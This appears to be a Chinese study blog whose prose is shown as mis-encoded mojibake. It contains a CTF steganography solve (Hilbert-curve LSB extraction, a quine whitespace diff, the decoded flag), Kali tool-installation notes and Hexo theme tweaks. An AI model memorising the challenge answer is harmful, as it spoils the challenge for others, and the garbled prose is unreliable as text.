<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="comment">#å®‰è£…ï¼špip install -i https://pypi.tuna.tsinghua.edu.cn/simple hilbertcurve</span></span><br><span class="line"><span class="keyword">from</span> hilbertcurve.hilbertcurve <span class="keyword">import</span> HilbertCurve</span><br><span class="line"><span class="comment">#æå–åƒç´ æ•°æ®</span></span><br><span class="line"><span class="keyword">with</span> Image.<span class="built_in">open</span>(<span class="string">&#x27;threebody_new.png&#x27;</span>) <span class="keyword">as</span> img:</span><br><span class="line">    arr = np.asarray(img)</span><br><span class="line">arr = np.vectorize(<span class="keyword">lambda</span> x: x&amp;<span class="number">1</span>)(arr[:,:,<span class="number">2</span>])</span><br><span class="line"><span class="comment">#ç¡®å®šå›¾ç‰‡ä¸­çš„æœ‰æ•ˆåŒºåŸŸ</span></span><br><span class="line"><span class="keyword">for</span> x1 <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr,<span class="number">0</span>)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[x1])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> x2 <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(np.size(arr,<span class="number">0</span>))):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[x2])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> y1 <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr,<span class="number">1</span>)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[:,y1])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> y2 <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(np.size(arr,<span class="number">1</span>))):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[:,y2])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#å‰ªåˆ‡å‡ºæœ‰æ•ˆäºŒç»´æ•°æ®</span></span><br><span class="line">arr = arr[x1:x2+<span class="number">1</span>, y1:y2+<span class="number">1</span>]</span><br><span class="line"><span class="comment">#print(x2+1-x1)#å¾—å‡ºæ˜¯128*128çš„çŸ©é˜µ</span></span><br><span class="line"><span class="comment">#æ„å»ºå¸Œå°”ä¼¯ç‰¹æ›²çº¿å¯¹è±¡</span></span><br><span class="line">hilbert_curve = HilbertCurve(<span class="number">7</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment">#ç”Ÿæˆä¸€ç»´çš„äºŒè¿›åˆ¶æµæ•°æ®</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr)):</span><br><span class="line">    [x,y] = hilbert_curve.point_from_distance(i)</span><br><span class="line">    s += <span class="built_in">str</span>(arr[<span class="number">127</span>-y][x])</span><br><span class="line"><span class="comment">#è½¬ASCIIæ–‡æœ¬å†™å…¥æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">int</span>(s,<span class="number">2</span>).to_bytes(<span class="number">2048</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><em>ä½†è¿™ä¸ªä¸€ç›´æ²¡èƒ½å®ç°ï¼Œä¸æ¸…æ¥šæ˜¯ä¸æ˜¯æ²¡å‰ªåˆ‡å›¾ç‰‡çš„åŸå› ã€‚</em></p>
<p><em><strong>0228ï¼Œç¬‘æ­»ï¼ŒçœŸçš„æ˜¯å› ä¸ºæ²¡å‰ªåˆ‡çš„åŸå› ã€‚</strong></em></p>
<h3 id="Cè¯­è¨€ç¼–è¯‘"><a href="#Cè¯­è¨€ç¼–è¯‘" class="headerlink" title="Cè¯­è¨€ç¼–è¯‘"></a>Cè¯­è¨€ç¼–è¯‘</h3><p>æ‰“å¼€<code>output.txt</code>å‘ç°æ˜¯Cè¯­è¨€è„šæœ¬ï¼Œæ‰€ä»¥ç”¨VSCodeè¿›è¡Œç¼–è¯‘è¿è¡Œï¼Œå‘ç°æ‰“å°çš„æ˜¯è‡ªèº«ã€‚</p>
<blockquote>
<p>å‡ºé¢˜äººçš„çŸ¥è¯†ç‚¹ï¼š</p>
<p>è¿™ç§å¯ä»¥æ‰“å°è‡ªèº«çš„ç¨‹åºå­¦åå«Quine</p>
</blockquote>
<p>å³ä½¿çœ‹ä¼¼æ˜¯ç›¸åŒçš„æ–‡ä»¶ï¼Œå¯èƒ½å­˜åœ¨æŸç§å·®å¼‚ï¼Œç›´æ¥ç”¨<code>BCompare4</code>å¯¹åŸå§‹æ–‡ä»¶ä»¥åŠè¾“å‡ºæ–‡ä»¶è¿›è¡Œå¯¹æ¯”ï¼Œå‘ç°åœ¨æ–‡ä»¶çš„ç¬¬11è¡Œå­˜åœ¨å·®åˆ«ã€‚</p>
<p>åŸå§‹æ–‡ä»¶å­˜åœ¨<code>Tab</code>ä»¥åŠ<code>Space</code>ï¼Œè½¬åŒ–æˆ<code>01</code>æ•°æ®æµã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230228110003750.png" class="" title="image-20230228110003750">

<p>ç”¨<code>Notepad++</code>å¾—åˆ°<code>01</code>æ•°æ®æµã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">01100110011011000110000101100111011110110100010000110001011011010100010101101110001101010110100100110000011011100100000101101100010111110101000001110010001100000011011000110001011001010110110101111101</span><br></pre></td></tr></table></figure>

<h3 id="æ•°æ®å¤„ç†"><a href="#æ•°æ®å¤„ç†" class="headerlink" title="æ•°æ®å¤„ç†"></a>æ•°æ®å¤„ç†</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">output = <span class="string">&#x27;2009092020090920200909200909202020090920202020092009092020090909200909090920090920092020200920202020090920202009200909200909200920092020200920092009092009090920202009092009200920090920092020092020090920202020200909200909092020092020202020092009092009092020200920090909090920092009202020202009090920200920202009092020202020200909200909202020090920202009200909202009200920090920090920092009090909092009&#x27;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">output = output.replace(<span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;0&#x27;</span>).replace(<span class="string">&#x27;09&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># print(output)</span></span><br><span class="line"><span class="comment"># 01100110011011000110000101100111011110110100010000110001011011010100010101101110001101010110100100110000011011100100000101101100010111110101000001110010001100000011011000110001011001010110110101111101</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;.&#123;8&#125;&#x27;</span>, output)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag += <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">2</span>)))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;D1mEn5i0nAl_Pr061em&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="230220"><a href="#230220" class="headerlink" title="230220"></a>230220</h1><h2 id="å®‰è£…kali"><a href="#å®‰è£…kali" class="headerlink" title="å®‰è£…kali"></a>å®‰è£…kali</h2><p><em>æœ¬æ¥è¿˜æ‰“ç®—çœ‹ä¸‹æœ‰æ— å¤‡ç”¨è™šæ‹Ÿï¼Œåæ¥ä¸‹è½½ï¼Œæ”¾å¼ƒäº†æŒ£æ‰ï¼Œç®—äº†ï¼Œé‡æ–°æ­ä¸ªç¯å¢ƒå§ã€‚</em></p>
<blockquote>
<p><a href="https://kali.download/virtual-images/current/">Index of &#x2F;virtual-images&#x2F;current&#x2F; (kali.download)</a></p>
</blockquote>
<h2 id="é…ç½®kaliç›¸å…³ç¯å¢ƒ"><a href="#é…ç½®kaliç›¸å…³ç¯å¢ƒ" class="headerlink" title="é…ç½®kaliç›¸å…³ç¯å¢ƒ"></a>é…ç½®kaliç›¸å…³ç¯å¢ƒ</h2><h3 id="ä¿®æ”¹å›½å†…æºä»¥åŠæ›´æ–°"><a href="#ä¿®æ”¹å›½å†…æºä»¥åŠæ›´æ–°" class="headerlink" title="ä¿®æ”¹å›½å†…æºä»¥åŠæ›´æ–°"></a>ä¿®æ”¹å›½å†…æºä»¥åŠæ›´æ–°</h3><ul>
<li><code>sudo vim /etc/apt/sources.list</code></li>
<li>å›½å†…æº</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å®˜æ–¹æº</span><br><span class="line"># deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"># deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">#æ ¹æ®éœ€è¦è‡ªå·±é€‰ä¸€ä¸ªï¼Œä¸­ç§‘å¤§çš„è¿˜å¯ä»¥</span><br><span class="line">#ä¸­ç§‘å¤§</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#é˜¿é‡Œäº‘</span><br><span class="line">#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#æ¸…åå¤§å­¦</span><br><span class="line">#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#æµ™å¤§</span><br><span class="line">#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#ä¸œè½¯å¤§å­¦</span><br><span class="line">#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">#é‡åº†å¤§å­¦</span><br><span class="line">#deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<ul>
<li>æ›´æ–°<ul>
<li><code>apt-get update</code>æ›´æ–°ç´¢å¼•</li>
<li><code>apt-get upgrade</code>æ›´æ–°è½¯ä»¶</li>
<li><code>apt-get dist-upgrade</code>å‡çº§</li>
<li><code>apt-get clean</code>åˆ é™¤ç¼“å­˜åŒ…</li>
<li><code>apt-get autoclean</code>åˆ é™¤æœªå®‰è£…çš„debåŒ…</li>
</ul>
</li>
</ul>
<h3 id="vmtool"><a href="#vmtool" class="headerlink" title="vmtool?"></a>vmtool?</h3><p>å…ˆå°†vmtoolsçš„å‹ç¼©åŒ…æ‹–åˆ°æ¡Œé¢ï¼Œç„¶åç›´æ¥è¿›è¡Œè§£å‹ç¼©å®‰è£…</p>
<ul>
<li><code>tar zxvf VMwareTools-10.2.5-8068393.tar.gz</code></li>
<li><code>./vmware-install.pl</code></li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230220133242773.png" class="" title="successful">

<ul>
<li><code>reboot</code></li>
</ul>
<h3 id="æŸ¥çœ‹python2-x2F-3ï¼Œå¹¶å®‰è£…ç›¸å…³åº“"><a href="#æŸ¥çœ‹python2-x2F-3ï¼Œå¹¶å®‰è£…ç›¸å…³åº“" class="headerlink" title="æŸ¥çœ‹python2&#x2F;3ï¼Œå¹¶å®‰è£…ç›¸å…³åº“"></a>æŸ¥çœ‹python2&#x2F;3ï¼Œå¹¶å®‰è£…ç›¸å…³åº“</h3><ul>
<li><p>python2.7.18</p>
</li>
<li><p>python3.11.1</p>
</li>
</ul>
<h4 id="gmpy2"><a href="#gmpy2" class="headerlink" title="gmpy2"></a>gmpy2</h4><h5 id="å®‰è£…ç›¸å…³ä¾èµ–åº“"><a href="#å®‰è£…ç›¸å…³ä¾èµ–åº“" class="headerlink" title="å®‰è£…ç›¸å…³ä¾èµ–åº“"></a>å®‰è£…ç›¸å…³ä¾èµ–åº“</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gmpåº“</span></span><br><span class="line">apt-get install libgmp-dev</span><br><span class="line"><span class="comment"># mpfråº“</span></span><br><span class="line">apt-get install libmpfr-dev</span><br><span class="line"><span class="comment"># mpcåº“</span></span><br><span class="line">apt-get install libmpc-dev</span><br></pre></td></tr></table></figure>

<h5 id="ï¼Ÿpip2-x2F-pip3"><a href="#ï¼Ÿpip2-x2F-pip3" class="headerlink" title="ï¼Ÿpip2&#x2F;pip3"></a>ï¼Ÿpip2&#x2F;pip3</h5><ul>
<li><p>pip2å®‰è£…</p>
<ul>
<li><code>wget https://bootstrap.pypa.io/pip/2.7/get-pip.py </code></li>
<li><code>python2 get-pip.py</code></li>
</ul>
</li>
<li><p>ä½†å®‰è£…å®Œä¹‹åæ— æ³•è°ƒç”¨ï¼Œåˆç†æ€€ç–‘æ˜¯è¿™ä¸€éƒ¨åˆ†å‡ºç°ç›¸åº”é—®é¢˜ï¼Œåº”è¯¥æ˜¯æ²¡å†™å…¥è·¯å¾„çš„é—®é¢˜</p>
</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230220145926996.png" class="" title="pip2">

<p><em><strong>å†å®‰è£…åˆæ´»äº†</strong></em></p>
<h5 id="ç¯å¢ƒå˜é‡"><a href="#ç¯å¢ƒå˜é‡" class="headerlink" title="ç¯å¢ƒå˜é‡"></a>ç¯å¢ƒå˜é‡</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vim ~/.zshrc</span><br><span class="line"><span class="comment"># åœ¨æœ€åä¸€è¡Œå†™å…¥</span></span><br><span class="line">export PATH=$PATH:/home/kali/.local/<span class="built_in">bin</span></span><br></pre></td></tr></table></figure>

<img src="/2023/12/31/WeeklyStudy/image-20230220155924940.png" class="" title="success">

<p><em><strong>okï¼Œæ•´æ´»ã€‚</strong></em></p>
<p><em><strong>230306æ”¾å¼ƒæŒ£æ‰ï¼Œç›´æ¥ç®¡ç†è€…æ¨¡å¼è¿›è¡Œå®‰è£…ç›¸å…³åº“æ“ä½œ</strong></em></p>
<h4 id="ï¼Ÿzsh"><a href="#ï¼Ÿzsh" class="headerlink" title="ï¼Ÿzsh"></a>ï¼Ÿzsh</h4><p>å‘½ä»¤è¡Œå‡ºç°zshç›¸å…³æŠ¥é”™ï¼Œå…·ä½“è§£å†³æ–¹æ³•å¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">mv .zsh_history .zsh_history_bad</span><br><span class="line">strings -eS .zsh_history_bad &gt; .zsh_history</span><br><span class="line">fc -R .zsh_history</span><br></pre></td></tr></table></figure>

<h4 id="pycryptodome"><a href="#pycryptodome" class="headerlink" title="pycryptodome"></a>pycryptodome</h4><p><code>pip3 install pycryptodome</code></p>
<h4 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h4><p>åˆ°å¯¹åº”ç›®å½•ä¸‹ï¼Œç›´æ¥ä½¿ç”¨outguessç›¸å…³å‘½ä»¤ã€‚</p>
<p>ä¹‹åä¼šæç¤ºæ²¡æœ‰å®‰è£…ï¼Œé‚£å°±æŒ‰å®ƒæ„æ€å®‰è£…å³å¯ã€‚</p>
<h4 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h4><p>ç®¡ç†å‘˜æƒé™è¿›å…¥å¯¹åº”çš„ç›®å½•ä¹‹ä¸‹ã€‚</p>
<p>ç„¶åè¿è¡Œ<code>gem install zsteg</code>å³å¯ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230220164617284.png" class="" title="image-20230220164617284">

<h4 id="ciphey"><a href="#ciphey" class="headerlink" title="ciphey"></a>ciphey</h4><h5 id="å®‰è£…httpsè¯ä¹¦"><a href="#å®‰è£…httpsè¯ä¹¦" class="headerlink" title="å®‰è£…httpsè¯ä¹¦"></a>å®‰è£…httpsè¯ä¹¦</h5><p><code>apt-get install -y apt-transport-https ca-certificates</code></p>
<h5 id="å®‰è£…docker"><a href="#å®‰è£…docker" class="headerlink" title="å®‰è£…docker"></a>å®‰è£…docker</h5><p><code>apt-get install docker.io</code></p>
<h5 id="éªŒè¯docker"><a href="#éªŒè¯docker" class="headerlink" title="éªŒè¯docker"></a>éªŒè¯docker</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">docker -v</span><br><span class="line">systemctl start docker</span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<img src="/2023/12/31/WeeklyStudy/image-20230220165711536.png" class="" title="docker success">

<h5 id="ï¼å®‰è£…ciphey"><a href="#ï¼å®‰è£…ciphey" class="headerlink" title="ï¼å®‰è£…ciphey"></a>ï¼å®‰è£…ciphey</h5><p><code>docker pull remnux/ciphey</code></p>
<p>ç›®å‰å¯ç”¨ä¸”æˆåŠŸçš„å‘½ä»¤ï¼š</p>
<p><code>docker run -it --rm remnux/ciphey -t [cipher]</code></p>
<p><em>-f [filename]ä¸çŸ¥é“ä¸ºå•¥ä¸€ç›´ä¸æˆåŠŸï¼Œæš‚ä¸”å…ˆæ”¾ç€çœ‹çœ‹ã€‚</em></p>
<h3 id="TBC-1"><a href="#TBC-1" class="headerlink" title="TBC"></a>TBC</h3><p><em>ä½†ä¸€æ—¶åŠä¼šå¥½åƒæ²¡å•¥éœ€è¦æµ‹è¯•æŸ¥çœ‹çš„ï¼Œæš‚ä¸”å…ˆæ”¾ç€å§ã€‚</em></p>
<h1 id="230221"><a href="#230221" class="headerlink" title="230221"></a>230221</h1><h2 id="BlindWatermark"><a href="#BlindWatermark" class="headerlink" title="BlindWatermark"></a>BlindWatermark</h2><blockquote>
<p><a href="https://github.com/ww23/BlindWatermark/releases">Releases Â· ww23&#x2F;BlindWatermark Â· GitHub</a></p>
</blockquote>
<ul>
<li>å®‰è£…<code>windows-x86_64.jar</code></li>
<li>å•æ°´å°å›¾æå–ç›²æ°´å°</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Usage: java -jar BlindWatermark.jar &lt;commands&gt;</span><br><span class="line">    commands:</span><br><span class="line">        encode &lt;option&gt; &lt;original image&gt; &lt;watermark&gt; &lt;embedded image&gt;</span><br><span class="line">        decode &lt;option&gt; &lt;original image&gt; &lt;embedded image&gt;</span><br><span class="line">    encode options:</span><br><span class="line">        -c discrete cosine transform</span><br><span class="line">        -f discrete fourier transform (Deprecated)</span><br><span class="line">        -i image watermark</span><br><span class="line">        -t text  watermark</span><br><span class="line">    decode options:</span><br><span class="line">        -c discrete cosine transform</span><br><span class="line">        -f discrete fourier transform (Deprecated)</span><br><span class="line">    example:</span><br><span class="line">        encode -ct input.png watermark output.png</span><br><span class="line">        decode -c  input.png output.png</span><br></pre></td></tr></table></figure>

<p><em>æ³¨æ„ä½¿ç”¨çš„ç®—æ³•ï¼Œ-cç¦»æ•£ä½™å¼¦å˜æ¢ï¼Œ-fç¦»æ•£å‚…é‡Œå¶å˜æ¢</em></p>
<ul>
<li>encode<ul>
<li><code>java -jar BlindWatermark.jar encode -ct[-ft/-ci/-fi] [] []</code></li>
</ul>
</li>
<li>decode<ul>
<li><code>java -jar BlindWatermark.jar decode -c[-f] []</code></li>
</ul>
</li>
</ul>
<h2 id="Rolan"><a href="#Rolan" class="headerlink" title="Rolan"></a>Rolan</h2><blockquote>
<p>AKA. ctftoolkit</p>
</blockquote>
<h2 id="ç†è®ºå‡ºé¢˜"><a href="#ç†è®ºå‡ºé¢˜" class="headerlink" title="ç†è®ºå‡ºé¢˜"></a>ç†è®ºå‡ºé¢˜</h2><p>æ‰“ç®—ä¸»è¦ä»ã€Šç½‘ç»œåè®®æœ¬è´¨è®ºã€‹æŸ¥æ‰¾ã€‚</p>
<h1 id="230224"><a href="#230224" class="headerlink" title="230224"></a>230224</h1><h2 id="ä¿®æ”¹ç™½å¤©é»‘å¤œæ¨¡å¼"><a href="#ä¿®æ”¹ç™½å¤©é»‘å¤œæ¨¡å¼" class="headerlink" title="ä¿®æ”¹ç™½å¤©é»‘å¤œæ¨¡å¼"></a>ä¿®æ”¹ç™½å¤©é»‘å¤œæ¨¡å¼</h2><h3 id="trial-1"><a href="#trial-1" class="headerlink" title="trial-1"></a>trial-1</h3><blockquote>
<p><a href="https://haomingzhang.com/hexo_3/">ä¸ºhexo next8.0ä¸»é¢˜æ·»åŠ ä¸€ä¸ªå¯ä»¥åˆ‡æ¢çš„é»‘è‰²&#x2F;å¤œé—´æ¨¡å¼ | Vinceâ€™s Blog (haomingzhang.com)</a></p>
</blockquote>
<p><code>_config.next.yml</code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230224094532931.png" class="" title="image-20230224094532931">

<p><code>vendors.njk</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;%- if theme.canvas_ribbon.enable %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">size</span>=<span class="string">&quot;&#123;&#123; theme.canvas_ribbon.size &#125;&#125;&quot;</span> <span class="attr">alpha</span>=<span class="string">&quot;&#123;&#123; theme.canvas_ribbon.alpha &#125;&#125;&quot;</span> <span class="attr">zIndex</span>=<span class="string">&quot;&#123;&#123; theme.canvas_ribbon.zIndex &#125;&#125;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123; theme.vendors.canvas_ribbon.url &#125;&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;%- endif %&#125;</span><br><span class="line"></span><br><span class="line">&#123;%- for name in js_vendors() %&#125;</span><br><span class="line">  &#123;&#123; next_vendors(name) &#125;&#125;</span><br><span class="line">&#123;%- endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¯•äº†æ²¡æˆåŠŸï¼Œç›´æ¥å˜æˆç©ºç™½å¸¦èƒŒæ™¯é¡µé¢äº†ã€‚</p>
<h3 id="trial-2"><a href="#trial-2" class="headerlink" title="trial-2"></a>trial-2</h3><blockquote>
<p><a href="https://www.techgrow.cn/posts/abf4aee1.html">Hexo Next 8.x ä¸»é¢˜æ·»åŠ å¯åˆ‡æ¢çš„æš—é»‘æ¨¡å¼ | Clay çš„æŠ€æœ¯åšå®¢ (techgrow.cn)</a></p>
</blockquote>
<p>hahahaä¹Ÿä¸è¡Œï¼Œç›´æ¥ç½‘é¡µéƒ½è§£æä¸å‡ºæ¥äº†ã€‚</p>
<p><em>çƒ¦äººï¼Œéš¾é“çœŸå¾—è¿˜æ•´ç‚¹å‰ç«¯çŸ¥è¯†ï¼Ÿ</em></p>
<h2 id="æ–°å¢folk-me"><a href="#æ–°å¢folk-me" class="headerlink" title="æ–°å¢folk me"></a>æ–°å¢folk me</h2><p><code>layout.njk</code></p>
<p>headbandæ¨¡å—å¢åŠ </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;your url&quot;</span> <span class="attr">class</span>=<span class="string">&quot;github-corner&quot;</span> <span class="attr">aria-label</span>=<span class="string">&quot;View source on GitHub&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;80&quot;</span> <span class="attr">height</span>=<span class="string">&quot;80&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 250 250&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:#fff; color:#151513; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);&quot;</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;currentColor&quot;</span> <span class="attr">style</span>=<span class="string">&quot;transform-origin: 130px 106px;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;octo-arm&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;currentColor&quot;</span> <span class="attr">class</span>=<span class="string">&quot;octo-body&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-class">.github-corner</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:octocat-wave <span class="number">560ms</span> ease-in-out&#125;<span class="keyword">@keyframes</span> octocat-wave&#123;<span class="number">0%</span>,<span class="number">100%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(<span class="number">0</span>)&#125;<span class="number">20%</span>,<span class="number">60%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(-<span class="number">25deg</span>)&#125;<span class="number">40%</span>,<span class="number">80%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(<span class="number">10deg</span>)&#125;&#125;<span class="keyword">@media</span> (<span class="attribute">max-width</span>:<span class="number">500px</span>)&#123;<span class="selector-class">.github-corner</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:none&#125;<span class="selector-class">.github-corner</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:octocat-wave <span class="number">560ms</span> ease-in-out&#125;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>pjax -&gt; true</li>
</ul>
<h2 id="æ–°å¢æ ‡é¢˜é¦–å­—æ¯å¤§å†™å½¢å¼"><a href="#æ–°å¢æ ‡é¢˜é¦–å­—æ¯å¤§å†™å½¢å¼" class="headerlink" title="æ–°å¢æ ‡é¢˜é¦–å­—æ¯å¤§å†™å½¢å¼"></a>æ–°å¢æ ‡é¢˜é¦–å­—æ¯å¤§å†™å½¢å¼</h2><img src="/2023/12/31/WeeklyStudy/image-20230224144610422.png" class="" title="image-20230224144610422">

<h2 id="è¿˜åœ¨çŠ¹è±«çš„åŠŸèƒ½é›†åˆ"><a href="#è¿˜åœ¨çŠ¹è±«çš„åŠŸèƒ½é›†åˆ" class="headerlink" title="è¿˜åœ¨çŠ¹è±«çš„åŠŸèƒ½é›†åˆ"></a>è¿˜åœ¨çŠ¹è±«çš„åŠŸèƒ½é›†åˆ</h2><h3 id="è‰ç¨¿ä»¥åŠå„ç§æ¨¡æ¿"><a href="#è‰ç¨¿ä»¥åŠå„ç§æ¨¡æ¿" class="headerlink" title="è‰ç¨¿ä»¥åŠå„ç§æ¨¡æ¿"></a>è‰ç¨¿ä»¥åŠå„ç§æ¨¡æ¿</h3><blockquote>
<p>ä½¿ç”¨<code>hexo new</code>æ¥å»ºç«‹æ–‡ç« ä¼šå°†æ–°æ–‡ç« å»ºç«‹åœ¨ <strong>source&#x2F;_posts</strong> ç›®å½•ä¸‹ï¼Œå½“ä½¿ç”¨ hexo generate ç¼–è¯‘æ–‡ä»¶æ—¶ï¼Œä¼šå°†å…¶ HTML ç»“æœç¼–è¯‘åœ¨ public ç›®å½•ä¸‹ï¼Œä¹‹å<code>hexo server</code>å°†ä¼šæŠŠ public ç›®å½•ä¸‹æ‰€æœ‰æ–‡ç« å‘å¸ƒã€‚</p>
</blockquote>
